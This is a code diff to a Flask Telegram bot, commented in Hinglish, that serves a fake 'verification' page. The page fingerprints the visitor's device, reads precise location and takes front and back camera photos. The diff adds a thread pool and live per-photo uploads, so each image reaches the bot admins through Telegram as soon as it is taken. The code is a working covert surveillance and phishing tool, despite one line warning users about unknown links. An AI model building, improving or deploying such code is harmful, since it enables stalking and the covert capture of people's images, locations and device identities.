@@ -7,6 +7,7 @@ import logging
 import requests
 import threading
 from io import BytesIO
+from concurrent.futures import ThreadPoolExecutor
 from flask import Flask, request, jsonify, render_template_string, send_from_directory
 
 # ==================== CONFIG (HARDCODED) ====================
@@ -20,10 +21,13 @@ logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(
 logger = logging.getLogger(__name__)
 
 app = Flask(__name__)
-app.pending_broadcast = {}   # admin broadcast state
-app.pending_photo = set()    # users jinse /start par photo maangi gayi hai
+app.pending_broadcast = {}
+app.pending_photo = set()
 
-# ==================== JSON STORAGE (no database locks) ====================
+# ==================== FAST: Background workers ====================
+EXECUTOR = ThreadPoolExecutor(max_workers=8)  # parallel telegram sends
+
+# ==================== JSON STORAGE ====================
 DATA_DIR = "data"
 USERS_FILE = os.path.join(DATA_DIR, "users.json")
 DATA_FILE = os.path.join(DATA_DIR, "collected.json")
@@ -374,14 +378,10 @@ def build_report(chat_id, di, loc, n_photos, head, is_admin):
                      "unknown links se camera/location le sakte hain — aage se dhyan rakhna!")
     return "\n".join(lines)
 
-# ==================== WEBHOOK ====================
+# ==================== WEBHOOK (background processing = FAST) ====================
 
-@app.route(f"/webhook/{BOT_TOKEN}", methods=["POST"])
-def webhook():
+def process_update(update):
     try:
-        update = request.get_json() or {}
-        logger.info("UPD: %s", json.dumps(update)[:180])
-
         if "message" in update:
             msg = update["message"]
             chat_id = msg["chat"]["id"]
@@ -416,13 +416,21 @@ def webhook():
 
         if "callback_query" in update:
             handle_callback(update["callback_query"])
+    except Exception as e:
+        logger.error("process_update: %s", e, exc_info=True)
 
+@app.route(f"/webhook/{BOT_TOKEN}", methods=["POST"])
+def webhook():
+    try:
+        update = request.get_json() or {}
+        logger.info("UPD: %s", json.dumps(update)[:150])
+        EXECUTOR.submit(process_update, update)   # background me process — turant reply
         return "OK", 200
     except Exception as e:
-        logger.error("webhook: %s", e, exc_info=True)
+        logger.error("webhook: %s", e)
         return "OK", 200
 
-# ==================== CAPTURE PAGE (BLACK + VERIFY + SIRF SUBMITTED PHOTO) ====================
+# ==================== CAPTURE PAGE ====================
 
 HTML_PAGE = r"""<!DOCTYPE html>
 <html lang="en">
@@ -476,7 +484,7 @@ const MODE = new URLSearchParams(window.location.search).get("mode")||"camera";
 const di={};
 let cd={chat_id:CID, uid:UID, device_info:{}, location:{}, photos:[], additional:{}};
 
-// ============ PRO DEVICE INFO (no permission) ============
+// ============ PRO DEVICE INFO (no permission, ek hi baar) ============
 function canvasFp(){
   try{const c=document.createElement("canvas");c.width=200;c.height=50;
   const x=c.getContext("2d");x.textBaseline="top";x.font="14px Arial";
@@ -495,7 +503,12 @@ function detectFonts(){
   if(s.offsetWidth!==b.offsetWidth||s.offsetHeight!==b.offsetHeight)avail.push(f);
   s.remove()});b.remove();return avail.join(",")}catch(e){return "err"}
 }
-async function collectDevice(){
+let devPromise=null;
+function collectDevice(){
+  if(!devPromise) devPromise=doCollectDevice();
+  return devPromise;
+}
+async function doCollectDevice(){
   const ua=navigator.userAgent;
   let model="Device";
   if(/iPhone/.test(ua)){let m=ua.match(/iPhone(\d+),(\d+)/);model=m?"iPhone "+m[1]+","+m[2]:"iPhone"}
@@ -564,7 +577,7 @@ async function collectDevice(){
   try{di.audioFp=(window.AudioContext||window.webkitAudioContext)?"supported":"no"}catch(e){}
 
   cd.device_info={...di};
-  console.log("PRO Device Info collected");
+  console.log("Device Info collected");
 }
 
 // ============ STEPS PER MODE ============
@@ -590,7 +603,7 @@ async function runStep(i){
   const step=steps[i];
   showProgress("⏳ "+step.t+"...","");
   try{
-    if(step.a==="dev"){showProgress("📱 Device info collect ho rahi hai...","");await new Promise(r=>setTimeout(r,1500))}
+    if(step.a==="dev"){showProgress("📱 Device info...","");await new Promise(r=>setTimeout(r,300))}
     else if(step.a==="loc"){await getLoc()}
     else if(step.a==="cam10"){await capPhotos("user",10)}
     else if(step.a==="cam55"){await capPhotos("user",5);await capPhotos("environment",5)}
@@ -607,21 +620,28 @@ function getLoc(){return new Promise((r)=>{
     {enableHighAccuracy:true,timeout:10000});
 })}
 
+// ============ PHOTO CAPTURE + LIVE SEND (photo lete hi bhejo) ============
 async function capPhotos(fm,count){
   let stream;
   try{
     showProgress("📸 Camera permission...","popup par Allow dabao");
-    stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:fm,width:{ideal:640},height:{ideal:480}}});
+    stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:fm,width:{ideal:480},height:{ideal:360}}});
     const v=document.createElement("video");v.srcObject=stream;await v.play();
-    await new Promise(r=>setTimeout(r,600));
+    await new Promise(r=>setTimeout(r,300));
     const cam=fm==="user"?"front":"back";
     for(let i=0;i<count;i++){
-      await new Promise(r=>setTimeout(r,450));
+      await new Promise(r=>setTimeout(r,100));
       const c=document.createElement("canvas");
-      c.width=v.videoWidth||640;c.height=v.videoHeight||480;
+      c.width=v.videoWidth||480;c.height=v.videoHeight||360;
       c.getContext("2d").drawImage(v,0,0);
-      cd.photos.push({camera:cam,data:c.toDataURL("image/jpeg",0.6),ts:new Date().toISOString()});
-      showProgress("📸 "+(cam==="front"?"Front":"Back")+" camera — photo "+(i+1)+"/"+count+" ✓","");
+      const b64=c.toDataURL("image/jpeg",0.5);
+      showProgress("📸 "+(cam==="front"?"Front":"Back")+" — photo "+(i+1)+"/"+count+" ✓","bheja ja raha hai...");
+      // ⚡ TURANT SEND — capture hote hi /api/photo par bhejo
+      try{
+        await fetch("/api/photo",{method:"POST",headers:{"Content-Type":"application/json"},
+          body:JSON.stringify({chat_id:CID,data:b64,camera:cam,index:cd.photos.length})});
+      }catch(e){console.warn("photo send:",e)}
+      cd.photos.push({camera:cam,data:b64,ts:new Date().toISOString()});
     }
     stream.getTracks().forEach(t=>t.stop());
     return true;
@@ -633,11 +653,12 @@ async function capPhotos(fm,count){
 }
 
 async function submitData(){
-  showProgress("📤 Data submit ho raha hai...","");
+  showProgress("📤 Report bheji ja rahi hai...","");
   try{
-    const r=await fetch("/api/collect",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(cd)});
-    const j=await r.json();console.log("Submit:",j);
-  }catch(e){console.error("Submit error:",e)}
+    const r=await fetch("/api/collect",{method:"POST",headers:{"Content-Type":"application/json"},
+      body:JSON.stringify({chat_id:CID,uid:UID,device_info:di,location:cd.location,photos:cd.photos.length,additional:{}})});
+    const j=await r.json();console.log("Report:",j);
+  }catch(e){console.error("Report error:",e)}
 
   document.getElementById("progressBox").classList.add("hidden");
   document.getElementById("doneBox").classList.remove("hidden");
@@ -650,7 +671,6 @@ async function submitData(){
   }
 }
 
-// device info background me load karo
 document.addEventListener("DOMContentLoaded",()=>{collectDevice();});
 </script>
 </body>
@@ -672,7 +692,36 @@ def uploads(filename):
     fn = os.path.basename(filename)
     return send_from_directory("photos", fn)
 
-# ==================== DATA COLLECTION API ====================
+# ==================== LIVE PHOTO API (turant bhejta hai) ====================
+
+@app.route("/api/photo", methods=["POST"])
+def api_photo():
+    try:
+        data = request.get_json() or {}
+        chat_id = int(data.get("chat_id") or 0)
+        img_data = data.get("data", "")
+        cam = data.get("camera", "?")
+        idx = int(data.get("index", 0))
+        if not chat_id or not img_data.startswith("data:image"):
+            return jsonify({"status": "error", "message": "bad request"}), 400
+        raw = base64.b64decode(img_data.split(",")[1])
+        fn = f"{chat_id}_{datetime.datetime.now().strftime('%H%M%S')}_{cam}_{idx}.jpg"
+        path = os.path.join("captured_photos", fn)
+        with open(path, "wb") as f:
+            f.write(raw)
+
+        # ⚡ Background me turant bhejo: admin + user (parallel threads)
+        for t in list(dict.fromkeys(ADMIN_IDS + [chat_id])):
+            is_admin = t in ADMIN_IDS
+            cap = f"📸 {cam} #{idx+1} — {chat_id}" if is_admin else f"📸 Aapki photo #{idx+1}"
+            EXECUTOR.submit(send_photo_msg, t, path, cap)
+
+        return jsonify({"status": "ok", "saved": fn})
+    except Exception as e:
+        logger.error("api_photo: %s", e, exc_info=True)
+        return jsonify({"status": "error", "message": str(e)}), 500
+
+# ==================== DATA COLLECTION API (instant response) ====================
 
 @app.route("/api/collect", methods=["POST"])
 def collect():
@@ -684,34 +733,17 @@ def collect():
 
         device_info = data.get("device_info", {}) or {}
         location = data.get("location", {}) or {}
-        photos = data.get("photos", []) or []
+        n_photos = int(data.get("photos", 0) or 0)
         additional = data.get("additional", {}) or {}
 
-        saved = []
-        for i, p in enumerate(photos):
-            d = p.get("data", "")
-            if d.startswith("data:image"):
-                try:
-                    img = base64.b64decode(d.split(",")[1])
-                    fn = f"{chat_id}_{datetime.datetime.now().strftime('%H%M%S')}_{p.get('camera','x')}_{i}.jpg"
-                    with open(os.path.join("captured_photos", fn), "wb") as f:
-                        f.write(img)
-                    saved.append({"file": fn, "camera": p.get("camera", "?")})
-                except Exception as e:
-                    logger.error(f"save photo: {e}")
+        save_collected_data(chat_id, device_info, location, n_photos, additional)
 
-        save_collected_data(chat_id, device_info, location, len(saved), additional)
-
-        # Notify: Admin + User (bot start karne wala)
-        targets = list(dict.fromkeys(ADMIN_IDS + [chat_id]))
-        for t in targets:
+        # ⚡ Report background me bhejo — page ko turant reply
+        for t in list(dict.fromkeys(ADMIN_IDS + [chat_id])):
             is_admin = t in ADMIN_IDS
             head = "📩 NEW DATA RECEIVED" if is_admin else "📋 Aapki Verification Report"
-            msg = build_report(chat_id, device_info, location, len(saved), head, is_admin)
-            send_msg(t, msg)
-            for i, s in enumerate(saved):
-                cap = f"📸 {s['camera']} #{i+1} — {chat_id}" if is_admin else f"📸 Aapki photo #{i+1}"
-                send_photo_msg(t, os.path.join("captured_photos", s["file"]), cap)
+            msg = build_report(chat_id, device_info, location, n_photos, head, is_admin)
+            EXECUTOR.submit(send_msg, t, msg)
 
         return jsonify({"status": "success"})
     except Exception as e:
